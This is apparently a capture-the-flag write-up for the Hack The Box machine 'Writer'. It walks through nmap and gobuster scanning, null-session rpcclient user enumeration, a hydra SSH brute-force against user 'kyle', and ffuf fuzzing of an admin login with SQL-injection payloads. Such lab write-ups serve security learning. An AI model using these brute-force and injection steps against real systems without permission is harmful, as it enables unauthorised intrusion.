# Writer 10.10.11.101

Core Concepts:

- SMB Enumeration  
- SSH brute forcing  
- pspy64  
- Python code for sending mail  
- Privilege escalation  

## Enumeration

As is tradition, we begin with an nmap scan 

```
nmap -sV -sC 10.10.11.101 -o nmap.writer.txt
```

nmap reveals that ports 22 and 80 are open.  80 usually indicates a website so lets add writer.htb to /etc/hosts and browse to the site.

```
sudo nano /etc/hosts
```

add `10.10.11.101  writer.htb` to the list
now we can browse directly to *writer.htb* in firefox
lets get a good wordlist and use gobuster to enumerate all directories

```
wget https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt
gobuster dir -u http://writer.htb -w common.txt -o gobuster.writer.txt
```

gobuster reveals `/about` `/contact` and `/logout` subdirectories
it's likely if we use a larger wordlist we'll find more so lets get a bigger one and run gobuster again

```
wget https://raw.githubusercontent.com/3ndG4me/KaliLists/master/dirbuster/directories.jbrofuzz
gobuster dir -u http://writer.htb -w directories.jbrofuzz -o gobuster.jbrofuzz.writer.txt
```

As suspected with get a handful of additional directories with a bigger wordlist. In particular `/administrative` looks promising.
Browsing to `writer.htb/adminstrative` reveals a login portal as a possible attack vector.
Beforehand, let's finish our enumeration by seeing if we can find any smbshares.

```
smbmap -H 10.10.11.101 -R > smbmap.writer.txt
```

smbmap reveals 3 disks with no access. Let's try to get connected with rpcclient with null session authentication.

```
rpcclient -U "" -N 10.10.11.101
```

The connection is a success, let's enumerate the users.

```
┌──(taylor㉿DESKTOP-72GCBB0)-[~/Documents/Writer]
└─$ rpcclient -U "" -N 10.10.11.101
rpcclient $> enumdomusers
user:[kyle] rid:[0x3e8]
rpcclient $> queryuser kyle
        User Name   :   kyle
        Full Name   :   Kyle Travis
        Home Drive  :   \\writer\kyle
        Dir Drive   :
        Profile Path:   \\writer\kyle\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
        Logoff Time              :      Wed, 06 Feb 2036 07:06:39 PST
        Kickoff Time             :      Wed, 06 Feb 2036 07:06:39 PST
        Password last set Time   :      Tue, 18 May 2021 10:03:35 PDT
        Password can change Time :      Tue, 18 May 2021 10:03:35 PDT
        Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> 
```

We got my boy Kyle Travis!
At this point I think we've garnered all we can from basic enumeration.  We've identified a potential attack vector at `/adminstrative` and some user credentials we might be able to use for an SSH brute force attack.  It's time to move on to...

## Foothold

Let's start with ssh bruteforcing our boy kyle.  First things first, download rockyou.txt from https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt. Then sick hydra on kyle with the rockyou.txt wordlist.  If you don't already 
have hydra just `sudo apt-get install hydra`.

``` 
hydra -l kyle -P rockyou.txt ssh://writer.htb -VV -f -t 60
```

After a few attempts it looks like the box is refusing ssh connections. Let's try SQL injection on the `/adminstration` subdomain
Let's use burpsuite to start poking around. Intercepting a post request with random creds to administration we see post are sent in the form:

```
POST /administrative HTTP/1.1
Host: 10.10.11.101
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.101/administrative
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

uname=admin&password=password
```

revealing that our user field is `uname` and password field is `password`, go ahead and save this (post.txt).  Let's see if this is vulnerable to injection.
First lets grab a payload.

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt
```

Now let's s use the payload with ffuf to fuzz a post

```
ffuf -X POST -request post.txt -w Generic-SQLi.txt:UNAME -w Generic-SQLi.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790 > ffuf.sqli.writer.txt
```

Fuzzing reveals a littany of different sqlinjection you can use for logging in. We'll go with `*/*`